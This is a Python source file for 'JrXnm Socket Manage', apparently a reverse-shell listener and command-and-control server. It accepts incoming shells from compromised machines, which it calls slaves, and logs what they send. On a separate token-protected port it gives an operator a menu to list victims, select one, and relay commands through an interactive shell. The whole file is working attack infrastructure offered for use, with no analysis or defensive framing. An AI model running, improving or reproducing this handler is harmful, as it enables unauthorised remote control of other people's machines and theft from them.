#! /usr/bin/env python
# -*- coding: utf-8 -*-
# __author__ = "JrXnm"
# Date: 18-10-12
import socket
import threading
import datetime
from hashlib import md5
import time
from utils.log import Log
from utils.io import save_info, log_save, server_log
import traceback
import optparse


MAX_CONNECTION_NUMBER = 16
EXIT_FLAG = False
slaves = {}
interactive_slave = None
interactive_state = 'common_rec'
interactive_user = None

# 每个slave一把锁lock
locks = {}
# 记录最近连接
connections = []
# 记录最近收到消息连接
recent = []


def node_hashs(host, port):
    s = "%s:%d" % (host, port)
    h = md5()
    h.update(s.encode('utf-8'))
    return h.hexdigest()


class Slave(object):
    """Salve"""

    def __init__(self, socket_fd):
        self.socket_fd = socket_fd
        self.name = None
        self.hostname, self.port = socket_fd.getpeername()
        self.node_hash = node_hashs(self.hostname, self.port)
        self.interactive = False
        self.first_connect_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def rename(self, name):
        self.name = name

    def getinfo(self):
        return self.hostname, self.port, self.node_hash, self.first_connect_time

    def slave_rec(self):
        lock = locks[self.node_hash]
        lock.acquire()
        # 接受被控shell信息发送给用户
        try:
            while True:
                buf = b''
                if EXIT_FLAG:
                    break
                while True:
                    rec = self.socket_fd.recv(2048)
                    buf += rec
                    if len(rec) <= 2048:
                        break
                if buf == b'':
                    break
                try:
                    if buf:
                        if interactive_state == 'interactive_state' and interactive_slave == self:
                            bufss = str(buf, encoding="utf-8")
                            fd_send(interactive_user, bufss)
                        elif interactive_state == 'common_rec' or interactive_slave != self:
                            t = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
                            path = './log/' + t + self.hostname + ' : ' + str(self.port) + '.log'
                            recent.append([path, datetime.datetime.now()])
                            save_info(path, buf, interactive_user)
                except Exception as e:
                    server_log(traceback.format_exc())
                    Log.error('Something wrong in send buf to user, But we saved in to file.', interactive_user)
                    t = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
                    path = './log/' + t + self.hostname + ' : ' + str(self.port) + '.log'
                    recent.append([path, datetime.datetime.now()])
                    save_info(path, buf, interactive_user)
                    server_log('\nsomething wrong!\n')
        except:
            server_log(traceback.format_exc())
            lock.release()

        self.del_socket()
        self.socket_fd.shutdown(socket.SHUT_RDWR)
        self.socket_fd.close()
        lock.release()

    def writecrontab(self):
        pass

    def del_socket(self):
        if self.node_hash in slaves.keys():
            slaves.pop(self.node_hash)

# def socket_recieve(slave):
#
#     global recent
#     # 没有操作交互shell时，每个连接socket加一个收听进程。
#     shost, sport = slave.socket_fd.getpeername()
#     while True:
#         if EXIT_FLAG:
#             break
#         slave.socket_fd.settimeout(3)
#         try:
#             buf = slave.socket_fd.recv(2048)
#         except socket.timeout:
#             time.sleep(5)
#         if buf == b'':
#             break
#         if buf:
#             t = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
#             path = './log/' + t + shost + ' : ' + str(sport) + '.log'
#             recent.append([path, datetime.datetime.now()])
#             with open(path, 'wb') as f:
#                 f.write(buf)
#         while interactive_state:
#             if interactive_slave.socket_fd != slave.socket_fd:
#                 break
#             time.sleep(0.5)


def check_online_slave():
    l = []
    for key in slaves.keys():
        try:
            msg = '\n'
            fd_send(slaves[key].socket_fd, msg)
            fd_send(slaves[key].socket_fd, msg)
            #slaves[key].socket_fd.recv(2048)
        except socket.error:
            server_log(traceback.format_exc())
            l.append(key)

    for key in l:
        slaves.pop(key)


def transfer2user(user_fd, mod, **kwargs):
    """所有接受用户消息进程都归于此"""
    global interactive_slave, EXIT_FLAG, interactive_state
    while True:
        server_log('get user info\n')
        if EXIT_FLAG:
            break
        if mod != 'interactive_shell':
            Log.command('>>>', user_fd)
        buf = user_fd.recv(2048)
        if buf == b'':
            break
        if buf:
            command = str(buf, encoding="utf-8")
            server_log(command)
            if mod == 'interactive_shell':
                slave_fd = kwargs['slave_fd']
                slave = kwargs['slave']
                if command == 'exit\n':
                    interactive_state = 'common_rec'
                    interactive_slave = None
                    break
                try:
                    fd_send(slave_fd, command)
                except socket.error:
                    slave.del_socket()
            elif mod == 'Control_Command':
                if command == 's\n':
                    print_salve(user_fd)
                elif command == '\n':
                    continue
                elif command == 'r\n':
                    recent_log(user_fd)
                elif command == 'i\n':
                    slave = interactive_slave
                    if not slave:
                        msg = 'Please choose the slave you want to Control\n'
                        Log.warning(msg, user_fd)
                        continue
                    interactive_state = 'interactive_state'
                    t = threading.Thread(target=transfer2user, args=(user_fd, 'interactive_shell'),
                                         kwargs={'slave_fd': slave.socket_fd, 'slave': slave})
                    t.start()
                    while interactive_state == 'interactive_state':
                        if EXIT_FLAG:
                            break
                        time.sleep(1)
                elif command == 'exit\n':
                    interactive_user == None
                    user_fd.shutdown(socket.SHUT_RDWR)
                    user_fd.close()
                    break
                elif command == 'c\n':
                    #check_online_slave()
                    msg = 'input the number of slave\n'
                    Log.warning(msg, user_fd)
                    print_salve(user_fd)
                    transfer2user(user_fd, 'choose_slave')
                else:
                    print_command(user_fd)
            elif mod == 'choose_slave':
                slave_num = command.strip()
                if slave_num == 'q':
                    break
                i = 0
                for key in slaves.keys():
                    if str(i) == slave_num:
                        interactive_slave = slaves[key]
                        break
                    i += 1
                if interactive_slave:
                    msg = 'select the slave :'
                    msg += interactive_slave.hostname + ' : ' + str(interactive_slave.port) + '\n'
                    Log.success(msg, user_fd)
                    return True
                else:
                    msg = 'Do not have this slave.\n'
                    fd_send(user_fd, msg)
                    return False


def print_salve(user_fd):
    global interactive_slave
    i = 0
    #check_online_slave()
    for key in slaves.keys():
        info = slaves[key].getinfo()
        sinfo = '[' + str(i) + '] ' + str(info[0]) + ' ' + str(info[1]) + ' ' + str(info[2]) + ' ' + info[3] + '\n'
        Log.info(sinfo, user_fd)
        i += 1
    if i == 0:
        msg = 'Do not have slaves, you can check the log\n'
        Log.warning(msg, user_fd)


def recent_log(user_fd):
    msg = 'Here are recent Connections:\n'
    Log.warning(msg, user_fd)
    msg = ''
    for connection in connections:
        shost, sport, dates = connection[0], connection[1], connection[2]
        t = dates.strftime("[ %Y-%m-%d %H:%M:%S ]")
        msg += t + ' ' + shost + ' : ' + sport + '\n'

    if not connections:
        msg = 'Do not have connections Logs\n'
    Log.info(msg, user_fd)

    msg = '\n\nHere are recent information:\n'
    Log.warning(msg, user_fd)
    msg = ''
    for rec in recent:
        path, dates = rec[0], rec[1]
        with open(path, 'rb') as f:
            s = str(f.read(), 'utf-8')
        msg += path + '\n' + s + '\n\n'
    if not recent:
        msg = 'Do not have recent information Logs\n'
        msg += 'You can read entail Log in directory\n'
    Log.info(msg, user_fd)

    # 删除内存中太久之前的Log
    now = datetime.datetime.now()
    for connection in connections:
        dates = connection[2]
        if (now - dates).seconds > 60:
            connections.remove(connection)
        else:
            break
    for rec in recent:
        dates = rec[1]
        if (now - dates).days > 5:
            recent.remove(rec)
        else:
            break


def print_command(user_fd):
    msg = '''    [s] : show all slave
    [c] : choose a slave
    [i] : open a interactive shell
    [r] : To print Recent connect log
    [exit] : exit\n'''
    Log.info(msg, user_fd)


def master(port):
    master_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    master_fd.bind(('', port))
    master_fd.listen(MAX_CONNECTION_NUMBER)

    while True:
        if EXIT_FLAG:
            break
        slave_fd, slave_addr = master_fd.accept()
        slave = Slave(slave_fd)
        slaves[slave.node_hash] = slave

        # 记录连接
        lock = threading.RLock()
        locks[slave.node_hash] = lock
        now = datetime.datetime.now()
        connections.append([slave.hostname, str(slave.port), now])
        log_save(slave_fd, interactive_user)
        t = threading.Thread(target=slave.slave_rec)
        t.start()
        try:
            msg = '\nSlave %s : %d is Online!\n' % (slave.hostname, slave.port)
            server_log(msg)
            if interactive_user:
                Log.warning(msg, interactive_user)
                Log.command('>>>', interactive_user)
        except Exception as e:
            server_log(traceback.format_exc())

    master_fd.shutdown(socket.SHUT_RDWR)
    master_fd.close()


def printlogo(user_fd):
    s = '''       ___    __   __                
      |_  |   \ \ / /                
        | |_ __\ V / _ __  _ __ ___  
        | | '__/   \| '_ \| '_ ` _ \ 
    /\__/ / | / /^\ \ | | | | | | | |
    \____/|_| \/   \/_| |_|_| |_| |_|

                           Socket Manage\n'''
    Log.error(s, user_fd)


def fd_send(fd, message):
    infob = str.encode(message)
    fd.send(infob)


def check_admin(user_fd):
    hint = 'This is JrXnm socket manage, Please send your token.\n'
    for i in range(3):
        Log.info(hint, user_fd)

        try:
            buf = user_fd.recv(2048)
        except socket.timeout:
            Log.error('TimeOut!', user_fd)
        if buf == b'':
            break
        with open('auth', 'r') as f:
            psw = f.read()
        if buf:
            bufss = str(buf, encoding="utf-8")
            if bufss != psw:
                hint = 'Authentication failed, Please send again!\n'
                continue
            printlogo(user_fd)
        return True
    return False


class Administrator(object):
    """TODO"""
    def __init__(self, name='admin'):
        self.name = name


def user_connect(port):
    server_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_fd.bind(('', port))
    server_fd.listen(5)

    while True:
        if EXIT_FLAG:
            break
        user_fd, user_addr = server_fd.accept()
        t1 = threading.Thread(target=manage, args=(user_fd,))
        t1.start()


def manage(user_fd):
    check_user = check_admin(user_fd)

    if check_user:
        msg = 'You are admin now \n'
        Log.success(msg, user_fd)
    else:
        msg = 'You are not admin, exit now \n'
        Log.info(msg, user_fd)
        user_fd.shutdown(socket.SHUT_RDWR)
        user_fd.close()
        return False
    global interactive_user
    interactive_user = user_fd
    t = threading.Thread(target=transfer2user, args=(user_fd, 'Control_Command'))
    t.start()


def main():
    # 管理进程，接受反弹shell以及消息.
    parse = optparse.OptionParser("python %prog --server-port <target stream> --user-port <target file path>")
    parse.add_option('--server-port', dest='sport', type='int', help='Server listen this port.')
    parse.add_option('--user-port', dest='uport', type='int', help='User connect from this port')

    (options, args) = parse.parse_args()
    if not options.sport or not options.uport:
        print('Use -h to see usage')
    else:
        t1 = threading.Thread(target=master, args=(options.sport,))
        t1.start()
        user_connect(options.uport)


if __name__ == '__main__':
    main()





